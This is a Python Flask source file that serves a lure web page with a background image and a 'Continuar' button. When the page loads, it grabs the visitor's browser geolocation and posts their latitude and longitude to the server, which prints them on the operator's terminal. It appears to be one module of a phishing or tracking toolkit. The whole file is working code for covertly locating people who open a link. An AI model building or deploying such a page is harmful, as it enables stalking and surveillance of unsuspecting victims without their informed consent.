from flask import Flask, render_template, request, jsonify
import sys
import pystyle
import logging
import os

def get_dirname(find_file):
    ruta_absoluta = os.path.abspath(find_file)
    directname = os.path.dirname(ruta_absoluta)
    return directname

sys.path.append(get_dirname('../../modulo/modulo.py'))

from modulo import colorate, main_head, ascii_randomly_time
from config import puertos, clean_terminal, basic

app = Flask(__name__)


@app.route('/')
def index():

    static_files = os.listdir('static')
    background_image = f"/static/{static_files[0]}"

    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Obtener Ubicación</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    button {{
            width: 200px;
            height: 50px;
            background-color: #4CAF50; /* Color de fondo */
            color: white; /* Color del texto */
            font-size: 18px;
            border-radius: 10px; /* Bordes redondeados */
            cursor: pointer;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); /* Sombra */
            transition: background-color 0.3s, transform 0.3s;
        }}

        /* Efecto al pasar el ratón */
        button:hover {{
            background-color: #45a049; /* Cambia de color al pasar el ratón */
            transform: scale(1.05); /* Aumenta ligeramente de tamaño */
        }}

        /* Estilo para centrar el botón */
        body {{
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-image: url('{background_image}');
        }}
    </style>
    <script>
        function getLocation() {{
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(showPosition);
            }} else {{
                alert("Geolocalización no es compatible en este navegador.");
            }}
        }}

        function showPosition(position) {{
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            alert("YA NOS CARGO LA CHINGADA: Latitud " + latitude + ", Longitud " + longitude);
            fetch('/getLocation', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/x-www-form-urlencoded',
                }},
                body: 'latitude=' + latitude + '&longitude=' + longitude + '&geolocation=true'
            }}).then(response => {{
                return response.json();
            }}).then(data => {{
                console.log(data);
            }});
        }}

        window.onload = function() {{
            getLocation();
        }};
    </script>
</head>
<body>
    <button onclick="getLocation()">Continuar</button>
</body>
</html>
    """

@app.route('/getLocation', methods=['POST'])
def getLocation():
    if request.method == 'POST':
        if 'geolocation' in request.form:
            latitude = request.form['latitude']
            longitude = request.form['longitude']

            response = pystyle.Box.DoubleCube(f'LAT, LON => {latitude},{longitude}')
            colorate(response)
            print()
            return jsonify({'message': 'Ubicación recibida correctamente'})
        else:
            return jsonify({'message': 'Error al obtener la ubicación'})

if __name__ == '__main__':
    clean_terminal()
    basic()
    app.run(debug=True, port=puertos())